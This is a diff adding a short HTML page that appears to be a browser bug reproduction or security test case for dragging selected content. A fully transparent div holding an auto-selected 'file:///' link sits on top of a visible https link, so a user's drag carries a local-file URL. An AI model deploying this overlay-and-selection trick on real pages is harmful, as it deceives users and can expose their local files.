@@ -1,0 +1,49 @@
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+
+<title>Drag & drop selected content - Local files can be opened</title>
+
+<meta http-equiv="Content-Style-Type" content="text/css">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+
+
+<script>
+function init()
+{ 
+	window.getSelection().selectAllChildren(document.getElementById('payload'));
+}
+
+
+</script>
+
+
+<body onload="init()">
+
+
+<div style="width:80%; height:300px; top:40px; left:10px; position:absolute; z-index:1;" id="StepsToReproduce" >
+
+
+
+<div style="width:600px; height:30px; top:0px; left:10px; position:absolute; z-index:2; opacity:0.0; filter:alpha(opacity=0);" onmouseover="init();setTimeout('window.stop();', 0700);" id="divwithselectedurl" >
+
+<p id="payload" style="cursor:pointer;" >
+<a href="https://www.helloworld.com/" onclick="setInterval('', 0010);init();setTimeout('', 0400);" >file:///</a>
+</p>
+	
+</div>
+
+<div style="width:600px; height:30px; top:5px; left:27px; position:absolute; z-index:1;" id="visiblediv" >
+
+<p id="visiblediv" ><a href="#" >https://www.helloworld.com/</a> </p>
+</div>
+
+
+</body>
+</html>
+
+
+
